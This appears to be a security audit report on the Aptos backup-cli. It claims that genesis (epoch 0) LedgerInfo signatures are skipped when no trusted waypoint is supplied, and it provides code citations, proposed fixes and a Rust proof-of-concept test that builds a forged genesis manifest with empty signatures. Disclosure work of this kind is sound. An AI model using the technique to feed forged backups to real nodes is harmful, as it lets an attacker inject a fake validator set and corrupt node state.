# Audit Report

## Title
Genesis Epoch Signature Verification Bypass in Backup Verification Allowing Byzantine Validator Injection

## Summary
The `EpochHistoryRestoreController::run()` function fails to verify signatures for epoch 0 (genesis) LedgerInfo when no trusted waypoints are provided. This allows an attacker to craft malicious epoch ending backup manifests containing arbitrary Byzantine validator information that passes all validation checks, completely breaking the chain-of-trust for subsequent epoch verification.

## Finding Description

The vulnerability exists in the epoch history restoration flow when the verify coordinator processes epoch ending backups without trusted waypoints. The `TrustedWaypointOpt` parameter is optional and defaults to an empty set. [1](#0-0) 

When `EpochHistoryRestoreController::run_impl()` processes the first manifest containing epoch 0, it initializes `previous_li` as `None` and passes this to the preheated restore controller: [2](#0-1) 

In `PreheatedEpochEndingRestore::run_impl()`, when `previous_epoch_ending_ledger_info` is `None` (which it is for the first manifest), the entire validation block that checks epoch continuity and verifies signatures is skipped: [3](#0-2) 

During the preheat phase in `EpochEndingRestoreController::preheat_impl()`, for epoch 0's first LedgerInfo, when no trusted waypoint exists and `previous_li` is `None`, the signature verification is completely bypassed: [4](#0-3) 

The only validations performed are:
1. Epoch number sequence check
2. Waypoint computed from LedgerInfo matches waypoint in manifest (both attacker-controlled)
3. Chunk counts match manifest metadata

**Attack Path:**
1. Attacker crafts a malicious `EpochEndingBackup` manifest for epoch 0 containing a fabricated `LedgerInfoWithSignatures` with:
   - Arbitrary `next_epoch_state` containing attacker-controlled validator set
   - Invalid or empty BLS signatures (won't be checked)
   - Correctly computed waypoint hash matching the fabricated LedgerInfo
2. Victim runs verify coordinator without `--trust-waypoint` parameter (optional, defaults to empty)
3. The malicious epoch 0 LedgerInfo passes all checks without signature verification
4. This corrupted LedgerInfo becomes part of the `EpochHistory` returned by `EpochHistoryRestoreController::run()`
5. When transaction or state snapshot verification occurs, `EpochHistory::verify_ledger_info()` uses the malicious epoch 0's `next_epoch_state` to verify epoch 1+ ledger infos: [5](#0-4) 

6. Any signatures matching the attacker's fabricated validator set will pass verification, allowing malicious transactions and state to be accepted as valid

The corrupted epoch_history is then passed to both state snapshot and transaction restore controllers where it's used for verification: [6](#0-5) [7](#0-6) 

## Impact Explanation

**Critical Severity** - This vulnerability represents a complete break of the cryptographic chain-of-trust in the backup verification system:

1. **Consensus Safety Violation**: The corrupted epoch history containing Byzantine validators can be used to validate fake transactions and state snapshots as legitimate, bypassing BFT consensus guarantees
2. **Cryptographic Correctness Breach**: BLS signature verification is completely bypassed for genesis, allowing unsigned or incorrectly signed data to be accepted
3. **Chain-of-Trust Poisoning**: Once epoch 0 is compromised, all subsequent epochs inherit the malicious validator set, enabling unlimited forgery
4. **Database Corruption Risk**: If this corrupted epoch_history is used in actual restore operations (not just verification), it could corrupt a node's AptosDB with Byzantine state

The existing test suite explicitly acknowledges this vulnerability by excluding epoch 0 from signature validation requirements: [8](#0-7) 

This meets the **Critical Severity** criteria: "Consensus/Safety violations" and could enable "Loss of Funds" if the corrupted data is used to verify malicious transactions.

## Likelihood Explanation

**High Likelihood** - The vulnerability is easily exploitable:

1. **No Special Privileges Required**: Any attacker can create backup manifests and distribute them
2. **Optional Security Feature**: The `--trust-waypoint` parameter that would prevent this attack is optional and not enforced
3. **No Warning**: The system provides no warning when running without trusted waypoints for genesis
4. **Common Usage Pattern**: Backup verification without trusted waypoints is a legitimate use case shown in tests
5. **Trivial to Execute**: Attacker only needs to craft JSON manifests and BCS-encoded files with fabricated data

The attack requires no validator compromise, no network position, and no complex timing - just the ability to provide backup files to a victim.

## Recommendation

**Immediate Fix**: Require at least one trusted waypoint for epoch 0 when verifying backups. Modify the validation logic to:

1. In `EpochHistoryRestoreController::run_impl()`, check if epoch 0 is present and verify a trusted waypoint exists for it:
```rust
// After line 358 in restore.rs
if !self.manifest_handles.is_empty() {
    // Load first manifest to check if it contains epoch 0
    let first_manifest: EpochEndingBackup = 
        self.storage.load_json_file(&self.manifest_handles[0]).await?;
    if first_manifest.first_epoch == 0 {
        ensure!(
            self.global_opt.trusted_waypoints.values().any(|wp| wp.version() == 0),
            "Epoch 0 (genesis) found in backup but no trusted waypoint provided. \
             Use --trust-waypoint to specify the genesis waypoint."
        );
    }
}
```

2. Add explicit validation in `PreheatedEpochEndingRestore::run_impl()` to reject genesis without validation:
```rust
// After line 217 in restore.rs
if previous_epoch_ending_ledger_info.is_none() 
    && first_li.ledger_info().epoch() == 0 
    && self.controller.trusted_waypoints.get(&first_li.ledger_info().version()).is_none() {
    return Err(anyhow!(
        "Cannot verify epoch 0 without trusted waypoint. Genesis must be validated."
    ));
}
```

3. Update documentation and CLI help text to emphasize that genesis waypoint is mandatory for security

**Long-term Fix**: Consider making trusted waypoints mandatory for any backup verification/restore operation, or at minimum require explicit acknowledgment when running without them.

## Proof of Concept

```rust
use crate::{
    backup_types::epoch_ending::{
        manifest::{EpochEndingBackup, EpochEndingChunk},
        restore::EpochHistoryRestoreController,
    },
    storage::{local_fs::LocalFs, BackupStorage},
    utils::{GlobalRestoreOpt, TrustedWaypointOpt, ConcurrentDownloadsOpt, 
            ReplayConcurrencyLevelOpt, RocksdbOpt},
};
use aptos_crypto::hash::HashValue;
use aptos_types::{
    aggregate_signature::AggregateSignature,
    block_info::BlockInfo,
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    epoch_state::EpochState,
    validator_verifier::random_validator_verifier,
    waypoint::Waypoint,
};
use std::{convert::TryInto, sync::Arc};
use aptos_temppath::TempPath;

#[tokio::test]
async fn test_malicious_genesis_bypass() {
    let backup_dir = TempPath::new();
    backup_dir.create_as_dir().unwrap();
    let store: Arc<dyn BackupStorage> = Arc::new(
        LocalFs::new(backup_dir.path().to_path_buf())
    );
    
    // Create malicious validator set controlled by attacker
    let (malicious_signers, malicious_verifier) = 
        random_validator_verifier(4, None, true);
    let malicious_epoch_state = EpochState {
        epoch: 1,
        verifier: Arc::new(malicious_verifier),
    };
    
    // Create fabricated genesis LedgerInfo with malicious next_epoch_state
    let malicious_genesis = LedgerInfo::new(
        BlockInfo::new(
            0, // epoch 0
            0, // round
            HashValue::zero(),
            HashValue::zero(),
            0, // version
            0, // timestamp
            Some(malicious_epoch_state), // ATTACKER'S VALIDATOR SET
        ),
        HashValue::zero(),
    );
    
    // Create LedgerInfoWithSignatures with EMPTY signatures (won't be verified!)
    let malicious_li_with_sigs = LedgerInfoWithSignatures::new(
        malicious_genesis.clone(),
        AggregateSignature::empty(), // Invalid signatures!
    );
    
    // Create manifest with computed waypoint
    let waypoint = Waypoint::new_epoch_boundary(&malicious_genesis).unwrap();
    
    // Write malicious LedgerInfo to chunk file
    let chunk_handle = store.create_for_write("chunk_0").await.unwrap();
    let chunk_bytes = bcs::to_bytes(&malicious_li_with_sigs).unwrap();
    store.save_and_close(chunk_handle, chunk_bytes).await.unwrap();
    
    // Create manifest
    let manifest = EpochEndingBackup {
        first_epoch: 0,
        last_epoch: 0,
        waypoints: vec![waypoint],
        chunks: vec![EpochEndingChunk {
            first_epoch: 0,
            last_epoch: 0,
            ledger_infos: "chunk_0".to_string(),
        }],
    };
    
    let manifest_handle = store.create_for_write("manifest").await.unwrap();
    let manifest_bytes = serde_json::to_vec(&manifest).unwrap();
    store.save_and_close(manifest_handle, manifest_bytes).await.unwrap();
    
    // Attempt to restore WITHOUT trusted waypoints
    let result = EpochHistoryRestoreController::new(
        vec!["manifest".to_string()],
        GlobalRestoreOpt {
            db_dir: None,
            dry_run: true,
            target_version: None,
            trusted_waypoints: TrustedWaypointOpt::default(), // EMPTY!
            rocksdb_opt: RocksdbOpt::default(),
            concurrent_downloads: ConcurrentDownloadsOpt::default(),
            replay_concurrency_level: ReplayConcurrencyLevelOpt::default(),
            enable_state_indices: false,
        }.try_into().unwrap(),
        store,
    )
    .run()
    .await;
    
    // VULNERABILITY: This should FAIL but it SUCCEEDS!
    assert!(result.is_ok(), "Malicious genesis was accepted without signature verification!");
    
    let epoch_history = result.unwrap();
    assert_eq!(epoch_history.epoch_endings.len(), 1);
    
    // The malicious validator set is now trusted for epoch 1+
    // Any transaction signed by attacker's validators will pass verification!
}
```

**Notes**

The vulnerability stems from an incorrect assumption that either trusted waypoints will be provided OR there will be a previous ledger info to verify against. For genesis (epoch 0), neither condition holds when waypoints are omitted, creating a complete validation gap. The test suite explicitly acknowledges this by excluding epoch 0 from the signature validation requirement when using empty signatures. This is a **critical chain-of-trust break** that undermines the entire cryptographic security model of the backup/restore system.

### Citations

**File:** storage/backup/backup-cli/src/utils/mod.rs (L331-346)
```rust
#[derive(Clone, Default, Parser)]
pub struct TrustedWaypointOpt {
    #[clap(
        long,
        help = "(multiple) When provided, an epoch ending LedgerInfo at the waypoint version will be \
        checked against the hash in the waypoint, but signatures on it are NOT checked. \
        Use this for two purposes: \
        1. set the genesis or the latest waypoint to confirm the backup is compatible. \
        2. set waypoints at versions where writeset transactions were used to overwrite the \
        validator set, so that the signature check is skipped. \
        N.B. LedgerInfos are verified only when restoring / verifying the epoch ending backups, \
        i.e. they are NOT checked at all when doing one-shot restoring of the transaction \
        and state backups."
    )]
    pub trust_waypoint: Vec<Waypoint>,
}
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L129-147)
```rust
                if let Some(wp_trusted) = self.trusted_waypoints.get(&wp_li.version()) {
                    ensure!(
                        *wp_trusted == wp_li,
                        "Waypoints don't match. In backup: {}, trusted: {}",
                        wp_li,
                        wp_trusted,
                    );
                } else if let Some(pre_li) = previous_li {
                    pre_li
                        .ledger_info()
                        .next_epoch_state()
                        .ok_or_else(|| {
                            anyhow!(
                                "Next epoch state not found from LI at epoch {}.",
                                pre_li.ledger_info().epoch()
                            )
                        })?
                        .verify(&li)?;
                }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L218-240)
```rust
        if let Some(li) = previous_epoch_ending_ledger_info {
            ensure!(
                li.next_block_epoch() == preheat_data.manifest.first_epoch,
                "Previous epoch ending LedgerInfo is not the one expected. \
                My first epoch: {}, previous LedgerInfo next_block_epoch: {}",
                preheat_data.manifest.first_epoch,
                li.next_block_epoch(),
            );
            // Waypoint has been verified in preheat if it's trusted, otherwise try to check
            // the signatures.
            if self
                .controller
                .trusted_waypoints
                .get(&first_li.ledger_info().version())
                .is_none()
            {
                li.next_epoch_state()
                    .ok_or_else(|| {
                        anyhow!("Previous epoch ending LedgerInfo doesn't end an epoch")
                    })?
                    .verify(first_li)?;
            }
        }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L276-312)
```rust
    pub fn verify_ledger_info(&self, li_with_sigs: &LedgerInfoWithSignatures) -> Result<()> {
        let epoch = li_with_sigs.ledger_info().epoch();
        ensure!(!self.epoch_endings.is_empty(), "Empty epoch history.",);
        if epoch > self.epoch_endings.len() as u64 {
            // TODO(aldenhu): fix this from upper level
            warn!(
                epoch = epoch,
                epoch_history_until = self.epoch_endings.len(),
                "Epoch is too new and can't be verified. Previous chunks are verified and node \
                won't be able to start if this data is malicious."
            );
            return Ok(());
        }
        if epoch == 0 {
            ensure!(
                li_with_sigs.ledger_info() == &self.epoch_endings[0],
                "Genesis epoch LedgerInfo info doesn't match.",
            );
        } else if let Some(wp_trusted) = self
            .trusted_waypoints
            .get(&li_with_sigs.ledger_info().version())
        {
            let wp_li = Waypoint::new_any(li_with_sigs.ledger_info());
            ensure!(
                *wp_trusted == wp_li,
                "Waypoints don't match. In backup: {}, trusted: {}",
                wp_li,
                wp_trusted,
            );
        } else {
            self.epoch_endings[epoch as usize - 1]
                .next_epoch_state()
                .ok_or_else(|| anyhow!("Shouldn't contain non- epoch bumping LIs."))?
                .verify(li_with_sigs)?;
        };
        Ok(())
    }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L375-381)
```rust
        let mut next_epoch = 0u64;
        let mut previous_li = None;
        let mut epoch_endings = Vec::new();

        while let Some(preheated_restore) = futs_stream.next().await {
            let manifest_handle = preheated_restore.controller.manifest_handle.clone();
            let lis = preheated_restore.run(previous_li).await?;
```

**File:** storage/backup/backup-cli/src/coordinators/verify.rs (L106-156)
```rust
        let epoch_history = if self.skip_epoch_endings {
            None
        } else {
            Some(Arc::new(
                EpochHistoryRestoreController::new(
                    epoch_endings
                        .into_iter()
                        .map(|backup| backup.manifest)
                        .collect(),
                    global_opt.clone(),
                    self.storage.clone(),
                )
                .run()
                .await?,
            ))
        };

        if let Some(backup) = state_snapshot {
            info!(
                epoch = backup.epoch,
                version = backup.version,
                "State snapshot selected for verification."
            );
            StateSnapshotRestoreController::new(
                StateSnapshotRestoreOpt {
                    manifest_handle: backup.manifest,
                    version: backup.version,
                    validate_modules: self.validate_modules,
                    restore_mode: StateSnapshotRestoreMode::Default,
                },
                global_opt.clone(),
                Arc::clone(&self.storage),
                epoch_history.clone(),
            )
            .run()
            .await?;
        }

        let txn_manifests = transactions.into_iter().map(|b| b.manifest).collect();
        TransactionRestoreBatchController::new(
            global_opt,
            self.storage,
            txn_manifests,
            None,
            None, /* replay_from_version */
            epoch_history,
            VerifyExecutionMode::NoVerify,
            self.output_transaction_analysis,
        )
        .run()
        .await?;
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L152-154)
```rust
        if let Some(epoch_history) = epoch_history {
            epoch_history.verify_ledger_info(&ledger_info)?;
        }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/tests.rs (L143-148)
```rust
                if overwrite && li.ledger_info().epoch() != 0 {
                    li = LedgerInfoWithSignatures::new(
                        li.ledger_info().clone(),
                        AggregateSignature::empty(),
                    );
                    should_fail_without_waypoints = true;
```
